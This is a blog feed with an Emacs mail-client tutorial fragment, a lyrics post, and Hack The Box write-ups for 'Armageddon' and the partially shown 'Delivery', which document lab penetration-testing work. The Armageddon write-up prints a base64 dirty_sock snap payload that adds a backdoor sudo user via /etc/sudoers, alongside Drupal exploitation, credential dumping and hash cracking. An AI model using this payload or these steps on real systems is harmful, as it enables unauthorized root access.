                                                 &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:in-reply-to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;⮩ &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                                 &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;string-match-p&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\\`Fwd:&quot;&lt;/span&gt;
                                                                  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; ⮯ &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                                 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;  &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                                                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;truncate-string-to-width&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;caar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                                                                          &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;truncate-string-to-width&lt;/span&gt;
                                                 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;replace-regexp-in-string&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\\`Re: \\|\\`Fwd: &quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
                                                                           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                                                 &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
                                      &lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;let*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;new-mail&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;car&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
             &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;subject&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;new-mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
             &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;caar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;new-mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:title&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:body&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-alert-grouped-mail-notification-formatter&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#'&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+mu4e-alert-grouped-mail-notification-formatter-with-bell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;And That’s it .&lt;/p&gt;
&lt;h3 id=&quot;screenshot&quot;&gt;Screenshot&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/general/mu4e_emacs.png&quot; alt=&quot;emacs_mu4e&quot; /&gt;&lt;/p&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="Emacs" /><category term="emacs" /><category term="mail" /><category term="offlineimap" /><category term="mu" /><category term="mu4e" /><category term="mbsync" /><category term="isync" /><category term="oauth2" /><category term="gmail" /><summary type="html">If you’re an emacs user and love using emacs for literally everything , then you are in the right place. In This Short Tutorial we are gonna learn how to setup Mu4e In Emacs From Scratch.</summary></entry><entry><title type="html">Special Lyrics</title><link href="/rawan/2021/04/17/Girl.html" rel="alternate" type="text/html" title="Special Lyrics" /><published>2021-04-17T00:00:00+00:00</published><updated>2021-04-17T00:00:00+00:00</updated><id>/rawan/2021/04/17/Girl</id><content type="html" xml:base="/rawan/2021/04/17/Girl.html">&lt;h3 id=&quot;special-lyrics-to-someone-special-&quot;&gt;Special Lyrics To Someone special .&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I Saw Your Pretty Face
When passing by in the street
As i looked my eyes popped out
you where a beauty queen
your hair it shone
and your eyes did too
oh my darling

As i lay dreaming
of what could be,
i started wondering 
what life had planned for me.
i began thinking
but most of all, my love,
i dream't of life with you.
Every morning i wake up 
to your smile 
i cannot help but wish 
it will one day be true.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="Rawan" /><category term="song" /><category term="sound" /><category term="lyrics" /><category term="crush" /><summary type="html">Special Lyrics To Someone special .</summary></entry><entry><title type="html">HTB - Armageddon</title><link href="/htb/2021/03/27/HTB-Armageddon.html" rel="alternate" type="text/html" title="HTB - Armageddon" /><published>2021-03-27T00:00:00+01:00</published><updated>2021-03-27T00:00:00+01:00</updated><id>/htb/2021/03/27/HTB-Armageddon</id><content type="html" xml:base="/htb/2021/03/27/HTB-Armageddon.html">&lt;p&gt;Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;We start of with an intense full port scan with nmap.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Sat Mar 27 16:47:39 2021 as: nmap -p- --min-rate 10000 -v -oN full_port.nmap 10.129.100.170&lt;/span&gt;
Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.100.170 from 0 to 5 due to 55 out of 183 dropped probes since last increase.
Warning: 10.129.100.170 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.100.170 from 640 to 1000 due to 110 out of 366 dropped probes since last increase.
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;armageddon.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.100.170&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.098s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 40576 closed ports, 24958 filtered ports
PORT   STATE SERVICE
80/tcp open  http

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Then we run another nmap scan to identify what version/service ports are running on.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Sat Mar 27 16:48:56 2021 as: nmap -sC -sV -p80 -oN scan.nmap 10.129.100.170&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;armageddon.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.100.170&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.070s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.4.16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-generator: Drupal 7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-robots.txt: 36 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Nmap Identifies Port 80 To be running drupal 7 which is an old version and possibly surfring from many RCE’s Exploits .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/exploits.png&quot; alt=&quot;searchsploit_exploits&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;foothold&quot;&gt;Foothold&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Checking Exploits that &lt;strong&gt;searchploit&lt;/strong&gt; showed and from the name of the box it looks like the drupal installation is highly vulnerable to Drupalgeddon2/3 , further tho running &lt;strong&gt;Metasploit&lt;/strong&gt; to launch the exploit.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/metasploit1.png&quot; alt=&quot;metasploit1&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;After Few Moments.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/msf_worked.png&quot; alt=&quot;msf_worked1&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;user-enumeration&quot;&gt;User Enumeration&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;After Getting A foothold on the machine i tried spawning another shell to get a full tty shell ,however the following error is giving .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/no_tty.png&quot; alt=&quot;no_revshell&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;This concludes that the there’s some sort of firewall blocking it or there’s restrictions that don’t allow such outcoming connections like sandboxed programs in this case apache?.&lt;/li&gt;
  &lt;li&gt;However there’s an allowed connection at port 4444&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/rev_shell.png&quot; alt=&quot;rev_shell&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Yet trying to spawn a tty results into another issue which confirms this a sandboxed environment .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/sandboxed.png&quot; alt=&quot;sandboxed_box&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Let’s get &lt;strong&gt;linpeas&lt;/strong&gt; and run it, PS: Since this is a restricted environment we cannot make files executable or get them with any port unless 80.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/linpeas.png&quot; alt=&quot;linpeas_start&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Linpeas did find drupal Mysql password&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/linpeas2.png&quot; alt=&quot;finding_mysql_creds&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Let’s check the full file [/var/www/html/sites/default/settings.php] for mysql username And Password.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/creds_mysql.png&quot; alt=&quot;creds_mysql&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Sweet , now let’s connect to mysql and dump what juicy stuff it holds .&lt;/li&gt;
  &lt;li&gt;Reminder, I had issues connecting to mysql directly with mysql client however i did a betterway to get the content of mysql database through mysqldump.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/mysql_dump.png&quot; alt=&quot;mysql_dump&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;now i can just download it and cat it or import it to my own mysql server.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/dump_view.png&quot; alt=&quot;dump_view&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;we can see that’s there’s the user &lt;strong&gt;brucetherealadmin&lt;/strong&gt; which is a local user , let’s crack its hash and try to ssh with it.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/crack_hash.png&quot; alt=&quot;brute_pass_crack&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Great it’s cracked , Now let’s try to ssh into &lt;strong&gt;Bruce&lt;/strong&gt; and read the &lt;strong&gt;user.txt&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/get_user.png&quot; alt=&quot;get_user&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;h3 id=&quot;initial-recon&quot;&gt;Initial Recon&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;After we got into user &lt;strong&gt;bruce&lt;/strong&gt; let’s see if he has any sudo permissions,terms whatever .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/sudo_int.png&quot; alt=&quot;sudo_terms&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Looks like he (&lt;strong&gt;bruce&lt;/strong&gt;) can install snap packages , This is really interesting .&lt;/li&gt;
  &lt;li&gt;Let’s create a crafted snap package and install it simply it will be just a setuid binary packaged in snap that will get us root , otherway is by overwritten the content of /etc/passwd by adding a root user to it that will can ssh to …. , there’s alot of way tho.&lt;/li&gt;
  &lt;li&gt;There’s few exploits that were made for snapd that allowed installation of malicious crafted snaps , however we don’t need to run those exploits because this version of snap is patched and we have root privileges to install any snap package.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;So In Order To Create a snap package i had to install an ubuntu vm cuz i’m running arch based os, so i cheated a bit and i didn’t want to run a vm so i used a prepacked snaps from those exploits &lt;a href=&quot;https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py&quot;&gt;link&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;i decoded the base64 and wrote it to a file using python
    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4256&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'=='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;crafted.snap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'wb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Then downloaded the file and installed it .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/inst_run.png&quot; alt=&quot;inst_run&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Now let’s su to the dirty_sock user we added to /etc/passwd and read the root flag.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/read_root.png&quot; alt=&quot;read_root&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And That’s it , that’s &lt;strong&gt;Armageddon&lt;/strong&gt; hope you enjoyed the writeup take care and i’ll see you all other time.&lt;/p&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="HTB" /><category term="HTB" /><category term="Medium" /><category term="Easy" /><summary type="html">Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).</summary></entry><entry><title type="html">HTB - Delivery</title><link href="/htb/2021/01/10/HTB-Delivery.html" rel="alternate" type="text/html" title="HTB - Delivery" /><published>2021-01-10T00:00:00+01:00</published><updated>2021-01-10T00:00:00+01:00</updated><id>/htb/2021/01/10/HTB-Delivery</id><content type="html" xml:base="/htb/2021/01/10/HTB-Delivery.html">&lt;p&gt;Delivery Easy Box By Ippsec&lt;/p&gt;

&lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;/h2&gt;
&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
&lt;p&gt;We start of with the nmap , nmap -sC -sV -p- -T4 -oN delivery.nmap delivery.htb
We can see there’s 3 ports open.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic30.png&quot; alt=&quot;nmap&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s browse http and see what’s there.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic0.png&quot; alt=&quot;Static&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We get a static website, looking at the site source there’s nothing much there but look around contact us we get this .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic26.png&quot; alt=&quot;Static_Contact&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see a note from the site owner?&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;so let’s look at the helpdisk at helpdesk.delivery.htb&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic29.png&quot; alt=&quot;helpdisk&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We see osticket support center,right of the top we check for any cves but they are all old and not affective so let’s create a new account .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic24.png&quot; alt=&quot;helpdisk_signup&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now After we created an account we get account verification but thinking logically we have entered a none existing email we cannot receive emails neither do anything.
Hmmm there must be somewhere around it . let’s check the open ticket thing .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic9.png&quot; alt=&quot;helpdisk_ticket_open&quot; /&gt;&lt;/p&gt;

&lt;p&gt;let’s fill those real quick .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic22.png&quot; alt=&quot;helpdisk_ticket_fill&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic25.png&quot; alt=&quot;helpdisk_ticket_fill2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We Get Support ticket request created with a ticket id and an email ?
At this point i was hmmmmmmmmmmmm an email , going back to the text we got earlier&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now before we go and create an account at mattermost let’s check out ticket status.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic7.png&quot; alt=&quot;helpdisk_ticket_cr&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We get an confirmation error,that’s not great at this point you gotta think out of the box. what email that might exist probably everywhere .
let’s submit a new ticket real quick and check again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic18.png&quot; alt=&quot;helpdisk_ticket_cr2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And We Get Another ticket_id and email address , let’s check our ticket status&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic19.png&quot; alt=&quot;helpdisk_ticket_ck&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And some how magically We got in as Admin .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic6.png&quot; alt=&quot;helpdisk_ticke_admin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let’s go back to the mattermost and create an account with our ticket email&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic3.png&quot; alt=&quot;helpdisk_mattermost&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic4.png&quot; alt=&quot;helpdisk_mattermost2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also we get email verification , at this point you should really use your mind for a bit . we go back to our check ticket status and we get a reply&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic1.png&quot; alt=&quot;helpdisk_mattermost1&quot; /&gt;&lt;/p&gt;

